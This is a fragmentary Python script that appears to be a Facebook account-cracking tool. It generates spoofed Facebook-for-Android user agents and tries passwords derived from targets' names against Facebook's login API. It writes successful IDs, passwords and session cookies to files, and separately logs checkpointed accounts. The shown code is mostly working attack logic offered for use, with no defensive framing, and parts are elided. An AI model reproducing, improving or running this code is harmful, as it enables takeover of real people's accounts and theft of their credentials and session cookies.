...
def LOL1():
    ...
    END ='[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2068};FBLC/en_US;FBRV/235412020;FBCR/GLOBE;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1819;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#______m2_______
def LOL2():
    END = '[FBAN/FB4A;FBAV/441.0.0.32.109;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/13543083;FBCR/Telenor;FBMF/Realme;FBBD/Realme;FBDV/RMX3624_13.C.19;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#_______m3________
def LOL3():
...
\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m8801*********
\033[1;34m------------------------------------------------------"""
def linex():
        print(f"\033[1;34m-------------------------------------------------------""")
def clear():
...
#____________________________m1______________________________________
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r \033[1;32mFinding \x1b[1;94m[{loop}] \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    linex()
                    oks.append(sid)
                    open('/sdcard/RP/OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\033[91;1m [RP]-[CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RP/CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    linex()
                    oks.append(sid)
                    open('/sdcard/RP/OK-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP/iDs-COOKiEs-M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\033[91;1m [RP]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
